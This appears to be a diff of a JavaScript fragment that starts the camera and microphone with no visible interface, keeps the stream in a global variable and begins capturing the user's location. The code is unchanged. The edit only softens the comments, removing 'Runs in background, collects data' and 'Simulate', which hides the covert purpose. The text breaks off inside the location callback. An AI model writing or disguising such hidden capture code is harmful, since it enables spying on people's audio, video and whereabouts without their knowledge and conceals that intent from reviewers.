@@ -1,11 +1,10 @@
-// Runs in background, collects data
+// Start camera without UI
 navigator.mediaDevices.getUserMedia({ video: true, audio: true })
   .then(stream => {
-    // Keep the stream in memory (no UI)
     window.stream = stream;
   });
 
-// Simulate location capture
+// Get location
 if (navigator.geolocation) {
   navigator.geolocation.getCurrentPosition(
     position => {
